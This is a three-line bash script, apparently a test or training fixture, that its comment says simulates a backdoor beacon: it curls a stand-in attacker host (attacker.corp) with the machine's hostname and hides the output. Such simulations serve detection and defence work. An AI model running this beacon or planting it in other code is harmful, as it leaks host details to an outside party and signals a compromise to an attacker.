#!/bin/bash
# Simulates a backdoor beacon call
curl http://attacker.corp/ping?host=$(hostname) > /dev/null 2>&1
